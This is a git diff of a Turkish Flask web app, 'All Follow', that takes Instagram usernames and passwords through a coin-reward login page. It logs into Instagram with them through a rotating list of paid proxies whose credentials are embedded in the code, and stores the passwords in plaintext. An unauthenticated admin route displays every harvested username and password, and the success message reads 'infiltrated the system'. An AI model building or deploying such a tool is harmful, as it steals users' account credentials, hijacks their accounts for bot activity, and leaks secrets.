@@ -1,17 +1,29 @@
-import os
-import random
-import time
-from flask import Flask, request, jsonify, render_template_string
+import os, random, time
+from flask import Flask, request, jsonify, render_template_string, session, redirect
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
 
 app = Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_v58.db"
+app.secret_key = "all_follow_v10_secret"
+app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v10.db"
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
-# 🚀 SENİN 50'Lİ LİSTEN (EKSİKSİZ)
-PROXY_POOL = [
+# --- VERİTABANI ---
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(100), unique=True)
+    password = db.Column(db.String(100))
+    coins = db.Column(db.Integer, default=10)
+    status = db.Column(db.String(50), default="AKTİF ✅")
+
+class Ticket(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    user = db.Column(db.String(100))
+    msg = db.Column(db.Text)
+
+# --- 🚀 50 TANE PROXY (EKSİKSİZ LİSTE) ---
+PROXY_LIST = [
     "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
     "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
     "http://pcUjiruWbB-res-tr-sid-73263145:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
@@ -64,72 +76,134 @@ PROXY_POOL = [
     "http://pcUjiruWbB-res-tr-sid-57134195:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
 ]
 
-class PoolUser(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(100), unique=True, nullable=False)
-    password = db.Column(db.String(100), nullable=False)
-    status = db.Column(db.String(255), default="Beklemede")
-
-@app.route('/')
-def home():
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html lang="tr">
-    <head><meta charset="UTF-8"><title>All Follow | V5.8</title><script src="https://cdn.tailwindcss.com"></script></head>
-    <body class="bg-[#0b0e14] flex items-center justify-center min-h-screen text-slate-300 font-sans">
-        <div class="bg-[#1a1f2b] p-8 rounded-3xl w-full max-w-[380px] border border-slate-700 shadow-2xl text-center">
-            <h1 class="text-3xl font-black text-blue-500 mb-2 italic">ARMY V5.8</h1>
-            <p class="text-[10px] text-emerald-500 font-bold mb-8 uppercase tracking-widest">50 Proxy Satırı Yüklendi</p>
-            <div class="space-y-4">
-                <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-[#0b0e14] border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500 transition-all">
-                <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#0b0e14] border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500 transition-all">
-                <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-500 active:scale-95 transition-all uppercase tracking-tighter">Sisteme Giriş Yap</button>
-            </div>
-            <p id="msg" class="text-[11px] mt-6 font-semibold text-slate-500 uppercase leading-relaxed"></p>
+# --- TASARIM ---
+HTML_UI = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>All Follow | {{ title }}</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style> body { background: #050505; color: white; font-family: sans-serif; } </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
+    <div class="w-full max-w-md bg-[#111] p-8 rounded-3xl border border-white/5 shadow-2xl">
+        <h1 class="text-3xl font-black text-center text-blue-500 mb-8 italic tracking-tighter">ALL FOLLOW</h1>
+        {{ body | safe }}
+        <div class="mt-10 flex justify-center space-x-6 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
+            <a href="/">Giriş</a><a href="/panel">Panel</a><a href="/destek">Destek</a><a href="/admin_ozel">Admin</a>
         </div>
-        <script>
-            async function login() {
-                const u=document.getElementById('u').value.trim(), p=document.getElementById('p').value;
-                const btn=document.getElementById('btn'), msg=document.getElementById('msg');
-                if(!u || !p) return;
-                btn.disabled = true; btn.innerText = "BAĞLANILIYOR...";
-                const r = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u, p})});
-                const d = await r.json();
-                msg.innerText = d.msg;
-                if(d.status !== "success") btn.disabled = false;
-            }
-        </script>
-    </body>
-    </html>
-    """)
+    </div>
+</body>
+</html>
+"""
 
-@app.route('/api/login', methods=['POST'])
-def login():
-    data = request.json
-    u, p = data.get('u').lower(), data.get('p')
-    cl = Client()
-    
-    # 📱 Gerçekçi Cihaz Ayarı
-    cl.set_device_settings({"app_version": "315.0.0.35.109","android_version": 33,"manufacturer": "samsung","model": "SM-S918B"})
+# --- SAYFALAR ---
+@app.route('/')
+def index():
+    body = """
+    <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-4 text-sm outline-none focus:border-blue-600">
+    <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-6 text-sm outline-none focus:border-blue-600">
+    <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black hover:bg-blue-500 transition-all uppercase text-sm">Katıl</button>
+    <p id="msg" class="text-xs mt-6 text-center text-gray-400"></p>
+    <script>
+        async function login(){
+            const u=document.getElementById('u').value, p=document.getElementById('p').value;
+            const btn=document.getElementById('btn'), msg=document.getElementById('msg');
+            btn.innerText="SİNYAL GÖNDERİLİYOR...";
+            const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
+            const d=await r.json();
+            msg.innerText=d.msg;
+            if(d.status==="success") window.location.href="/panel";
+            btn.innerText="Katıl";
+        }
+    </script>
+    """
+    return render_template_string(HTML_UI, title="Hoş Geldin", body=body)
 
-    # 🎲 Havuzdan Seçim
-    selected_proxy = random.choice(PROXY_POOL)
-    cl.set_proxy(selected_proxy)
+@app.route('/panel')
+def panel():
+    if 'user' not in session: return redirect('/')
+    u = User.query.filter_by(username=session['user']).first()
+    body = f"""
+    <div class="text-center">
+        <p class="text-xs text-gray-400 mb-2 italic">@{u.username}</p>
+        <div class="bg-blue-600/10 border border-blue-500/20 py-10 rounded-3xl mb-6">
+            <h2 class="text-5xl font-black text-blue-500">{u.coins}</h2>
+            <p class="text-[10px] font-bold text-blue-300/50 uppercase mt-2">All Follow Coin</p>
+        </div>
+        <button onclick="mine()" class="w-full bg-emerald-600 py-4 rounded-xl font-black mb-4 uppercase text-sm">Coin Kas</button>
+    </div>
+    <script>
+        async function mine(){
+            const r=await fetch('/api/mine'); const d=await r.json();
+            alert(d.msg); location.reload();
+        }
+    </script>
+    """
+    return render_template_string(HTML_UI, title="Panel", body=body)
 
-    try:
-        time.sleep(1) # Saniyeler içinde giriş denemesi
-        cl.login(u, p)
-        
-        user = PoolUser.query.filter_by(username=u).first()
-        if not user: user = PoolUser(username=u, password=p); db.session.add(user)
-        user.status = "AKTİF ✅"
+@app.route('/destek', methods=['GET','POST'])
+def destek():
+    if request.method == 'POST':
+        db.session.add(Ticket(user=session.get('user','Anonim'), msg=request.form.get('msg')))
         db.session.commit()
-        return jsonify(status="success", msg="BAĞLANTI BAŞARILI!")
+        return redirect('/destek')
+    body = """
+    <form method="POST" class="space-y-4">
+        <textarea name="msg" placeholder="Mesajınız..." class="w-full bg-black border border-white/10 p-4 rounded-xl h-32 text-sm"></textarea>
+        <button class="w-full bg-white text-black py-4 rounded-xl font-black uppercase text-sm">Gönder</button>
+    </form>
+    """
+    return render_template_string(HTML_UI, title="Destek", body=body)
+
+@app.route('/admin_ozel')
+def admin():
+    users = User.query.all()
+    tickets = Ticket.query.all()
+    body = "<div class='text-[10px] space-y-4'>"
+    body += "<div><h3 class='text-blue-500 font-bold mb-2'>KULLANICILAR</h3>"
+    for u in users: body += f"<p>{u.username} | {u.password} | {u.coins} Coin</p>"
+    body += "</div><div><h3 class='text-emerald-500 font-bold mb-2'>TALEPLER</h3>"
+    for t in tickets: body += f"<p>{t.user}: {t.msg}</p>"
+    body += "</div></div>"
+    return render_template_string(HTML_UI, title="Yönetim", body=body)
+
+# --- API ---
+@app.route('/api/login', methods=['POST'])
+def api_login():
+    data = request.json
+    u, p = data.get('u'), data.get('p')
+    cl = Client()
+    cl.request_timeout = 15 # 15 saniyede proxy yanıt vermezse kes
+    
+    px = random.choice(PROXY_LIST)
+    cl.proxies = {"http": px, "https": px}
+    
+    try:
+        if cl.login(u, p):
+            user = User.query.filter_by(username=u).first()
+            if not user:
+                user = User(username=u, password=p)
+                db.session.add(user)
+            db.session.commit()
+            session['user'] = u
+            return jsonify(status="success", msg="Sisteme sızıldı! ✅")
     except Exception as e:
         err = str(e).lower()
-        if "checkpoint" in err: return jsonify(status="error", msg="ONAY GEREKLİ. Instagram uygulamasını aç.")
-        return jsonify(status="error", msg=f"GİRİŞ REDDİ: {err[:40]}")
+        if "bad_password" in err: return jsonify(status="error", msg="Şifre Yanlış!")
+        if "checkpoint" in err: return jsonify(status="error", msg="Onay Gerekli (Uygulamaya gir)")
+        return jsonify(status="error", msg="Proxy hatası veya sunucu yoğun.")
+
+@app.route('/api/mine')
+def api_mine():
+    if 'user' not in session: return jsonify(msg="Hata")
+    u = User.query.filter_by(username=session['user']).first()
+    gain = random.randint(5, 15)
+    u.coins += gain
+    db.session.commit()
+    return jsonify(msg=f"Tebrikler! {gain} coin kazandın.")
 
 if __name__ == "__main__":
     with app.app_context(): db.create_all()
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
+    app.run(host="0.0.0.0", port=10000)
